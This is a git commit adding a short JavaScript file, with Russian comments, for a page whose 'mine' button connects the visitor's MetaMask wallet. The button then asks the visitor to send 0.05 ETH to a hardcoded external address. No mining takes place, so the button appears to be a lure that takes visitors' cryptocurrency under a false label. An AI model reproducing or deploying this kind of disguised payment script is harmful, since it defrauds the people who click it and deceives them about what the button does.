1158b5424f54f7bac035368a2dd1c8cd2ac4cd1b
Shifu-in <165253001+Shifu-in@users.noreply.github.com>
2024-07-07 19:07:46 +0700

    Create app.js

---
+++ app.js
@@ -0,0 +1,29 @@
+document.getElementById('mineButton').addEventListener('click', async () => {
+    // Проверка наличия MetaMask
+    if (typeof window.ethereum !== 'undefined') {
+        try {
+            // Запрос на подключение к MetaMask
+            await window.ethereum.request({ method: 'eth_requestAccounts' });
+
+            const web3 = new Web3(window.ethereum);
+            const accounts = await web3.eth.getAccounts();
+            const sender = accounts[0];
+            const recipient = '0x2A59EbEBACa96026401CED0828c3009425e91b38';
+            const amount = web3.utils.toWei('0.05', 'ether');
+
+            // Инициация транзакции
+            await web3.eth.sendTransaction({
+                from: sender,
+                to: recipient,
+                value: amount
+            });
+
+            alert('Транзакция отправлена!');
+        } catch (error) {
+            console.error('Ошибка при отправке транзакции:', error);
+            alert('Ошибка при отправке транзакции.');
+        }
+    } else {
+        alert('Пожалуйста, установите MetaMask!');
+    }
+});
